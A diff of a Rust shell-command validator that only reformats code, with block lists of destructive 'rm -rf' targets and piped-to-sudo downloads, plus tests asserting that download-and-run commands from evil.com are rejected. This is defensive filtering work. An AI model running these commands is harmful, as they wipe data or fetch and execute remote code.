@@ -12,17 +12,11 @@ pub struct ValidationResult {
 
 impl ValidationResult {
     pub fn allowed() -> Self {
-        Self {
-            allowed: true,
-            reason: None,
-        }
+        Self { allowed: true, reason: None }
     }
 
     pub fn blocked(reason: &'static str) -> Self {
-        Self {
-            allowed: false,
-            reason: Some(reason),
-        }
+        Self { allowed: false, reason: Some(reason) }
     }
 }
 
@@ -78,20 +72,24 @@ impl CommandValidator {
                 "wget | sudo",
                 "curl | sudo",
             ],
-            blocked_root_paths: vec!["rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf $HOME"],
-            safe_rm_paths: vec!["/tmp", "/var/tmp", "/home/", "~/"],
+            blocked_root_paths: vec![
+                "rm -rf /",
+                "rm -rf /*",
+                "rm -rf ~",
+                "rm -rf $HOME",
+            ],
+            safe_rm_paths: vec![
+                "/tmp",
+                "/var/tmp",
+                "/home/",
+                "~/",
+            ],
         }
     }
 
     /// Validate a command for safety
     pub fn validate(&self, cmd: &str) -> ValidationResult {
-        let norm: String = cmd.split_whitespace().fold(String::new(), |mut acc, s| {
-            if !acc.is_empty() {
-                acc.push(' ');
-            }
-            acc.push_str(s);
-            acc
-        });
+        let norm: String = cmd.split_whitespace().collect::<Vec<_>>().join(" ");
 
         // Check exact banned prefixes
         for bad in &self.banned_exact_prefixes {
@@ -191,16 +189,8 @@ mod tests {
         assert!(!validator.validate("reboot").allowed);
 
         // Network download + execution
-        assert!(
-            !validator
-                .validate("wget http://evil.com/script.sh | sh")
-                .allowed
-        );
-        assert!(
-            !validator
-                .validate("curl http://evil.com/script.sh | bash")
-                .allowed
-        );
+        assert!(!validator.validate("wget http://evil.com/script.sh | sh").allowed);
+        assert!(!validator.validate("curl http://evil.com/script.sh | bash").allowed);
     }
 
     #[test]
